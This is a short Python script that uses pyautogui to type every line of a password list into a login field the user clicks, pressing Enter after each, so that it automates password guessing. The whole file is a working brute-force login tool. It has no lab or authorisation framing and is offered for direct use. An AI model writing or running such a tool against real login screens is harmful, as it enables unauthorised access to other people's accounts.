# Imports
import pyautogui
import time

# defining class
class MacroBruteForce():

    #initiating the class
    def __init__(self, path):
        self.path = path
    
    # Basic pyautogui commands to repeat the command
    def BruteForceNormal(self):
        with open(self.path, 'r') as file:
            for line in file:
                pyautogui.typewrite(line)
                pyautogui.press('enter')

if "__main__" == __name__:
    input("Press Enter To Start, " 
    "Click On The Target Element, Then After 5 Seconds It"
    " Will Start The BruteForce: ")

    time.sleep(5)

    Brute = MacroBruteForce("BruteForce_login_sys/Passwords.txt")
    Brute.BruteForceNormal()
